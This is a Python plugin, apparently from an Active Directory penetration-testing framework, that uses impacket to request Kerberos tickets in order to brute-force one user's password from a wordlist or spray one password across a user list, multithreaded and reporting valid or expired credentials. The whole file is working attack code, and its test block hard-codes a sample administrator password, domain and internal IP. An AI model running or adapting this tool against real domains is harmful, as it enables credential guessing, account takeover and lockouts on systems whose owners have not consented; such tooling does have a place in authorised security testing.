import argparse
from copy import copy

from impacket.krb5 import constants
from impacket.krb5.kerberosv5 import getKerberosTGT
from impacket.krb5.types import Principal

from plugins.AD import PluginAdExploitBase
from utils import output
from utils.consts import AllPluginTypes


def test_tgt(user: str, password: str, domain: str, dc_ip: str):
    try:
        userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        getKerberosTGT(userName, password, domain, '', '', kdcHost=dc_ip)
        output.success(f'{user}:{password}({"valid password"})')
    except Exception as e:
        if 'KDC_ERR_KEY_EXPIRED' in str(e):
            output.success(f'{user}:{password}({"KDC_ERR_KEY_EXPIRED"})')
        else:
            output.error(f'{user}:{password}({str(e)})')


class PluginADKerberosBrute(PluginAdExploitBase):
    """
    kerberos 密码爆破&密码喷洒
    """

    display = "kerberos 密码爆破/喷洒"
    alias = "krbute"
    p_type = AllPluginTypes.Exploit

    def __init__(self):
        super().__init__()

    def reg_argument(self, parser: argparse.ArgumentParser):
        parser.add_argument("-d", "--domain", help="domain name(test.local)", dest="domain")
        parser.add_argument("-p", "--password", help="password to spray", dest="password")
        parser.add_argument("-pf", "--password-file", help="password to spray", dest="password_file")
        parser.add_argument("-u", "--user", help="user to spray", dest="user")
        parser.add_argument("-uf", "--user-file", help="file contains user names to spray", dest="user_file")
        parser.add_argument("--dc-ip", help="ip address of dc", dest="dc_ip")
        parser.add_argument("-t", "--threads", help="ip address of dc", dest="threads", default=10)

    def run_script(self, args) -> dict:
        from concurrent.futures import ThreadPoolExecutor, wait, ALL_COMPLETED
        """
        脚本入口函数
        :return: bool
        """
        # password brute
        if args.password_file is not None and args.user is not None:
            try:
                with open(args.password_file) as pf:
                    with ThreadPoolExecutor(max_workers=args.threads) as pool:
                        fs = [pool.submit(test_tgt, args.user, pwd.strip(), args.domain, args.dc_ip) for pwd in pf]
                        wait(fs, return_when=ALL_COMPLETED)
            except Exception as ex:
                output.error(f'{ex}')

        # password spray
        if args.password is not None and args.user_file is not None:
            try:
                with open(args.user_file) as pf:
                    with ThreadPoolExecutor(max_workers=args.threads) as pool:
                        fs = [pool.submit(test_tgt, user.strip(), args.password, args.domain, args.dc_ip) for user in pf]
                        wait(fs, return_when=ALL_COMPLETED)
            except Exception as ex:
                output.error(f'{ex}')

        result = copy(self.result)
        # TODO
        return result


if __name__ == '__main__':
    user = 'administrator'
    password = 'zawx@2022'
    domain = 'test16.local'
    dc_ip = '192.168.16.249'
    try:
        test_tgt(user, password, domain, dc_ip)
    except Exception as e:
        print(e)
